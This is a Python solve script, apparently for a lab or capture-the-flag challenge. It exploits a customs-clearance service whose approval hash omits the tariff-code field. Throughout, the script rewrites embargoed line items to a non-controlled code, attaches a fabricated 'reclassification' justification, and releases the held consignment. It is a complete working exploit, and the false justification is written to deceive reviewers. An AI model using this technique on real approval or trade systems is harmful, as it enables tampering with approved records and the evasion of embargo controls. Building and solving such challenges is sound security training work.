#!/usr/bin/env python3
"""Release a held consignment by amending a field the approval hash doesn't cover.

Usage: python3 solve.py <base_url>
e.g.   python3 solve.py http://<assigned-host>:<port>

The customs approval binds to a hash over `covered_fields` only, and `hs_code` is
not one of them. PATCHing a line item's hs_code after approval leaves the approval
valid, so switching the embargoed item to a non-controlled tariff code lets the
consignment release.
"""
import json
import sys
import urllib.request

base = sys.argv[1].rstrip('/')


def req(method, path, body=None):
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(base + path, data=data, method=method,
                               headers={'Content-Type': 'application/json'})
    return json.load(urllib.request.urlopen(r, timeout=20))


# pick the held consignment
held = next(c for c in req('GET', '/consignments')['consignments'] if c['status'] == 'HELD')
cid = held['id']
detail = req('GET', '/consignments/%s' % cid)

# find the embargoed line item (approval already exists and stays valid)
embargo = set(req('GET', '/embargo-list').get('hs_codes', []))
for item in detail['lineitems']:
    if item['hs_code'] in embargo:
        # a recognised, non-controlled tariff code already present elsewhere in the manifest
        req('PATCH', '/consignments/%s/lineitems/%d' % (cid, item['k']),
            {'hs_code': '8536.90',
             'justification': 'Reclassification to correct non-controlled subheading per review.'})

print(req('POST', '/consignments/%s/release' % cid))
